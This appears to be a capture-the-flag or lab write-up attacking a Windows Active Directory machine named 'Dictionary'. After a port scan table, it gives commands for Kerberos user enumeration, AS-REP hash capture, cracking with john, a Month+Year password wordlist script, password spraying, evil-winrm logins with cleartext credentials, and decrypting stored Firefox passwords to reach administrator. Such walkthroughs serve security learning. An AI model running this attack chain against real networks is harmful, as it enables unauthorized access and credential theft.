# Dictionary

**IP Address:** 172.31.3.4

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 135/tcp | open | msrpc | Microsoft Windows RPC  |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn  |
| 3268/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 3269/tcp | open | tcpwrapped |   |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services  |
| 389/tcp | open | ldap | Microsoft Windows Active Directory LDAP  |
| 445/tcp | open | microsoft-ds |   |
| 464/tcp | open | kpasswd5 |   |
| 49666/tcp | open | msrpc | Microsoft Windows RPC  |
| 49668/tcp | open | msrpc | Microsoft Windows RPC  |
| 49671/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 49672/tcp | open | msrpc | Microsoft Windows RPC  |
| 49678/tcp | open | msrpc | Microsoft Windows RPC  |
| 49702/tcp | open | msrpc | Microsoft Windows RPC  |
| 49736/tcp | open | msrpc | Microsoft Windows RPC  |
| 53/tcp | open | domain | Simple DNS Plus  |
| 593/tcp | open | ncacn_http | Microsoft Windows RPC over HTTP 1.0 |
| 5985/tcp | open | http | Microsoft HTTPAPI httpd 2.0 |
| 636/tcp | open | tcpwrapped |   |
| 88/tcp | open | kerberos-sec | Microsoft Windows Kerberos  |
| 9389/tcp | open | mc-nmf | .NET Message Framing  |
| 123/udp | open | ntp | NTP v3 |
| 135/udp | open|filtered | msrpc |   |
| 137/udp | open | netbios-ns | Microsoft Windows or Samba netbios-ns  |
| 138/udp | open|filtered | netbios-dgm |   |
| 139/udp | open|filtered | netbios-ssn |   |
| 1434/udp | open|filtered | ms-sql-m |   |
| 161/udp | open|filtered | snmp |   |
| 162/udp | open|filtered | snmptrap |   |
| 1900/udp | open|filtered | upnp |   |
| 445/udp | open|filtered | microsoft-ds |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 49152/udp | open|filtered | unknown |   |
| 500/udp | open|filtered | isakmp |   |
| 514/udp | open|filtered | syslog |   |
| 520/udp | open|filtered | route |   |
| 53/udp | open | domain |   |
| 631/udp | open|filtered | ipp |   |
| 67/udp | open|filtered | dhcps |   |
| 68/udp | open|filtered | dhcpc |   |
| 69/udp | open|filtered | tftp |   |

## Exploitation
### Exploit Details (Bruteforce / Found Credentials)
* **Name** - Bruteforce / Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. Bruteforce usernames

Commands
```
kerbrute userenum --dc $ip -d dictionary.csl /usr/share/seclists/Usernames/Names/names.txt
```

![Execute Exploit](images/exploit1.png)

2. Capture user hashes

Commands
```
GetNPUsers.py dictionary.csl/ -usersfile users.txt -format john -outputfile hash
```

![Execute Exploit](images/exploit2.png)

3. Crack hashes with john. 

Commands
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit3.png)

4. Connect with the found credentials to enumerate other users and add the newly found users to users.txt file. 

Commands
```
rpcclient -U izabel $ip
June2013
```

![Execute Exploit](images/exploit5.png)

5. Creat a wordlist with the found password in the form of (Month/Year)

Code
```python
months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']                                                                    
years = ['2013', '2014', '2015', '2016', '2017', '2018', '2019', '2020', '2021']                                                                                                                       
                                                                                                                                                                                                       
with open('wordlist.txt', 'w') as wordlist:                                                                                                                                                            
    for month in months:                                                                                                                                                                               
        for year in years:                                                                                                                                                                             
            password = month + year                                                                                                                                                                    
            wordlist.write(f'{password}\n')
```

Commands
```
python3 wordlist.py
```

![Execute Exploit](images/exploit4.png)

6. Brute force the other user accounts using the created wordlist. 

Commands
```
crackmapexec smb -u users.txt -p wordlist.txt -d dictionary.csl $ip
```

![Execute Exploit](images/exploit6.png)

![Execute Exploit](images/exploit7.png)

7. Login with the newly found credentials

Commands
```
evil-winrm -i $ip -u BACKUP-Izabel -p October2019
whoami
type ..\Desktop\access.txt
```

![Execute Exploit](images/exploit8.png)

## Privilege Escalation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

winPEAS show us that there is some Firefox passwords stored on the server. 

1. Decrypt the passwords. 

Commands
```
python3 /opt/firepwd/firepwd.py key4.db
```

![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

2. Use the found passwords against the users.txt file to crack accounts. 

Commands
```
crackmapexec smb -u users.txt -p passwords.txt -d dictionary.csl $ip
```

![Execute Exploit](images/privesc3.png)

3. Use the found credentials to login to the administrator account. 


Commands
```bash
evil-winrm -i $ip -u administrator -p kC7pbrQAsTT
whoami
type ..\Desktop\system.txt
```

![Execute Exploit](images/privesc4.png)

## Loot
```
access.txt
44d83b9985749480f7dd57f23e72c851
system.txt
5f10b45e7f64ce852e6e0ac0eda224ff
```